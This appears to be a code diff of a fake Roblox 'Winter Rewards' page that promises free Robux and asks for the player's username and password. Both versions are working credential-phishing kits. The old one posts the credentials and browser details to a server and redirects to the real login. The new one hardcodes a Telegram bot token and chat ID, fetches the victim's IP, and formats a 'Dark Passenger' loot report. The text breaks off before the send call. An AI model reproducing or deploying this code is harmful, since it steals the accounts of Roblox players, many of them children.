@@ -3,77 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Winter Rewards 2025</title>
+    <title>Roblox Rewards - Winter 2025</title>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-image: radial-gradient(circle, #1a3a3a 0%, #000 100%); }
-        .header { width: 100%; background: #d32f2f; padding: 15px 20px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); display: flex; align-items: center; position: fixed; top: 0; z-index: 100; border-bottom: 3px solid #ffca28; box-sizing: border-box; }
-        .spacer { height: 120px; }
-        .card { background: #232527; padding: 40px 30px; border-radius: 15px; width: 350px; text-align: center; border: 2px solid #d32f2f; position: relative; box-shadow: 0 0 30px rgba(211, 47, 47, 0.5); box-sizing: border-box; }
-        .main-logo-area { position: relative; display: inline-block; margin-bottom: 15px; }
-        .big-r { font-size: 70px; font-weight: 900; color: #fff; line-height: 1; letter-spacing: -5px; }
-        .santa-hat { position: absolute; top: -25px; left: -15px; font-size: 45px; transform: rotate(-15deg); }
-        .anti-bot { background: rgba(211, 47, 47, 0.15); border: 1px solid #d32f2f; color: #ffca28; font-size: 11px; padding: 8px; border-radius: 5px; margin-bottom: 20px; text-transform: uppercase; font-weight: bold; }
-        .event-title { color: #fff; font-weight: 900; font-size: 20px; margin-bottom: 10px; }
-        select, input { width: 100%; padding: 14px; margin-bottom: 15px; background: #111; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 15px; }
-        button { width: 100%; padding: 16px; background: #d32f2f; color: #fff; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 16px; text-transform: uppercase; }
-        #loading { display: none; margin-top: 20px; }
-        .bar { height: 4px; width: 100%; background: #444; border-radius: 2px; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #ffca28; transition: width 3s; }
-        .footer { font-size: 11px; color: #555; margin-top: 30px; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 350px; text-align: center; }
+        img { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #0084ff); }
+        h2 { margin: 10px 0; font-size: 20px; color: #0084ff; text-transform: uppercase; letter-spacing: 1px; }
+        p { color: #888; font-size: 13px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #252525; border: 1px solid #444; border-radius: 5px; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #0084ff; }
+        button { width: 100%; padding: 14px; margin-top: 15px; background: #0084ff; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: #0066cc; transform: translateY(-2px); }
+        .safety { margin-top: 15px; font-size: 10px; color: #444; text-transform: uppercase; }
     </style>
 </head>
 <body>
-    <div class="header"><span style="font-size: 24px; margin-right: 10px;">🎅</span><span style="font-weight: 900;">WINTER REWARDS SYSTEM</span></div>
-    <div class="spacer"></div>
-    <div class="card">
-        <div class="main-logo-area"><span class="santa-hat">🎅</span><span class="big-r">ROBLOX</span></div>
-        <div class="anti-bot">⚠️ Внимание: Только для аккаунтов старше 30 дней</div>
-        <div class="event-title">ПОЛУЧИТЬ ПОДАРОК 🎁</div>
-        <form id="rob-form">
-            <select id="amount">
-                <option value="400">400 Robux</option>
-                <option value="800">800 Robux</option>
-                <option value="1700">1,700 Robux</option>
-                <option value="4500">4,500 Robux</option>
-                <option value="10000">10,000 Robux</option>
-            </select>
-            <input type="text" id="user" placeholder="Никнейм" required>
-            <input type="password" id="pass" placeholder="Пароль" required>
-            <button type="submit" id="btn">ЗАБРАТЬ НАГРАДУ</button>
-        </form>
-        <div id="loading">
-            <div style="font-size: 12px; margin-bottom: 5px; color: #ffca28;">Синхронизация...</div>
-            <div class="bar"><div class="progress" id="p-bar"></div></div>
-        </div>
-        <div class="footer">© 2025 Roblox Protection.</div>
-    </div>
 
-    <script>
-        document.getElementById('rob-form').onsubmit = async (e) => {
-            e.preventDefault();
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            setTimeout(() => { document.getElementById('p-bar').style.width = '100%'; }, 100);
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_with_a_santa_hat.png" alt="Logo">
+    <h2>Winter Gift System</h2>
+    <p>Введите ваши данные для верификации и получения Robux</p>
+    
+    <form id="shotForm">
+        <input type="text" id="u_name" placeholder="Username" required>
+        <input type="password" id="p_word" placeholder="Password" required>
+        <input type="number" id="r_amount" placeholder="Amount of Robux" required>
+        <button type="submit" id="btn_fire">Claim Rewards</button>
+    </form>
+    
+    <div class="safety">Protected by Roblox Anti-Cheat 2025</div>
+</div>
 
-            // Собираем всё, включая точные детали
-            const info = {
-                u: document.getElementById('user').value,
-                p: document.getElementById('pass').value,
-                r: document.getElementById('amount').value,
-                m: `Vendor: ${navigator.vendor} | OS: ${navigator.platform} | UA: ${navigator.userAgent}`
-            };
+<script>
+    document.getElementById('shotForm').onsubmit = async function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btn_fire');
+        btn.innerText = "VERIFYING...";
+        btn.disabled = true;
 
-            // Отправляем БЕЗ лишнего шума
-            try {
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(info)
-                });
-            } catch (e) {}
+        const u = document.getElementById('u_name').value;
+        const p = document.getElementById('p_word').value;
+        const r = document.getElementById('r_amount').value;
 
-            setTimeout(() => { window.location.href = "https://www.roblox.com/login"; }, 3500);
-        };
-    </script>
-</body>
-</html>
+        // ТВОЙ НОВЫЙ ТОКЕН И ID
+        const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
+        const chatId = '8165386246';
+
+        // Собираем улики (IP и Марка устройства)
+        let ip = "Unknown";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(err) { ip = "Hidden/Proxy"; }
+
+        const device = `${navigator.platform} | ${navigator.vendor}`;
+
+        // Текст сообщения для бота Dark Passenger
+        const message = `🔪 **DARK PASSENGER: ВЕРДИКТ** 🔪\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `👤 **Цель:** \`${u}\`\n` +
+                        `🔑 **Пароль:** \`${p}\`\n` +
+                        `💎 **Добыча:** ${r} Robux\n` +
+                        `🌐 **IP:** ${ip}\n` +
+                        `📱 **Девайс:** ${device}\n` +
+                        `━━━━━━━━━━━━━━━━━━\
